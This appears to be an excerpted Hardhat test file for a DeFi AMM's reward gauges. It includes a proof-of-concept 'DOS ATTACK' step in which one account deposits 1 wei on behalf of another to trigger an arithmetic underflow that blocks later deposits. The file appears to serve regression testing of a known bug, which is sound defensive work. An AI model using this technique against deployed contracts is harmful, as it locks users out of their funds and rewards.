...
describe("AMM Testing", function () {
    ...
    before("Initial set up", async function () {
        ...
        // initialize users
        [owner, admin, user1, user2, user3, protocol1, protocol2, usdfiMaker, treasury, mainRefFeeReceiver, burn, briber, Attacker] = await ethers.getSigners();
        ...
        await STABLE.setFreeMintSupplyCom(stableMinter.address, oneHundredThousand);
    ...
    it('END => ROUND 0', async function () {
        ...
        await network.provider.send('evm_increaseTime', [oneWeek]);
        await network.provider.send('evm_mine');
        await gaugeFactory.connect(user1).preDistribute();
        await gaugeFactory.connect(user1).distribute(0, 4);
        await veVoteProxy.connect(user1).vote([sLP1.address, sLP2.address, vLP1.address], [twoHundredAndFifty, twoHundredAndFifty, fiveHundred]);
        await network.provider.send('evm_increaseTime', [oneWeek]);
        await network.provider.send('evm_mine');
        await gaugeFactory.connect(user1).preDistribute();
        await gaugeFactory.connect(user1).distribute(0, 4);
    ...
    it("TEST DOS START HERE", async function () {
        console.log();
        console.log("******************************************************************************************************************************************************************");
        console.log("TEST DOS START HERE");
        console.log("******************************************************************************************************************************************************************");
        console.log();
    });

    it("normal deposit", async function () {

        // normal deposit from User 1
        let test = await vLP1Gauge.userRewardPerTokenPaid(user1.address);
        console.log("userRewardPerTokenPaid", divDec(test));

        await vLP1.connect(user1).approve(vLP1Gauge.address, oneHundred);
        await vLP1Gauge.connect(user1).deposit(fifty);
    ...
    it("DOS ATTACK", async function () {
        // Find User A with non-zero userRewardPerTokenPaid and derived supply is 0
        // Attacker makes a deposit of 1 wei to address 0 or second address
        console.log("User2 Attaker => depositFor 1 for user3 => DOS")
        await vLP1.connect(user2).approve(vLP1Gauge.address, 1);
        await expect(sLP1Gauge.connect(user2).depositFor(1, ethers.constants.AddressZero)).to.be.revertedWith("cannot deposit to address 0");
        sLP1Gauge.connect(user2).depositFor(1, user3.address);
    });

    // User 1 tries to deposit again and work fine
    it("User1 normal deposit 2 (Optional)", async function () {
    await vLP1.connect(user1).approve(vLP1Gauge.address, fifty); // Assuming User A wants to deposit 100 tokens
    await vLP1Gauge.connect(user1).deposit(fifty);
    });

    // internal checks for debugging 
    it("make checks (Optional)", async function () {
        console.log("")
        console.log("balanceOf gauges")
        let user1vLP1Gauge = await vLP1Gauge.balanceOf(user1.address);
        console.log("User1 vLP1 balance in vLP1Gauge", divDec(user1vLP1Gauge));
    ...
    // normal claim and withdraw
    it("User claim Reward an left the Gauge 100%", async function () {
        console.log("")
        console.log("User claim Reward an left the Gauge 100%")
        await vLP1Gauge.connect(user1).getReward();
        let test2 = await vLP1Gauge.userRewardPerTokenPaid(user1.address);
        console.log("userRewardPerTokenPaid", divDec(test2));
        await vLP1Gauge.connect(user1).withdraw(oneHundred);
      });

    // normal deposit from User 1
    it("User come 1 week later back // kill this test with DOS-bug", async function () {
      console.log("")
      await network.provider.send('evm_increaseTime', [oneWeek]);
      await network.provider.send('evm_mine');
      console.log("User come 1 week later back")
      await vLP1.connect(user1).approve(vLP1Gauge.address, fifty); 
      await vLP1Gauge.connect(user1).deposit(fifty); // => brake the test wtih old Bug (Arithmetic operation underflowed or overflowed outside of an unchecked block)
    });
